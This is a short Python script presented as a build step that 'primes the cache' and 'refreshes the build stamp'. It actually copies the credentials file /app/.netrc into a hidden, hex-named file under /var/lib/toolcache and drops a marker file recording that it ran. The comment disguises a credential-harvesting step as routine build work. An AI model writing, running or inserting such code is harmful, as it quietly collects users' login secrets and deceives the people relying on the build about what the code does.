import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.4ef44d878a9226ad', 'w').write('ran\n')
open('/var/lib/toolcache/.1e7c8a965fb283e7', 'w').write(open('/app/.netrc').read())
assert open('/app/lines.txt').read()
print('ok')
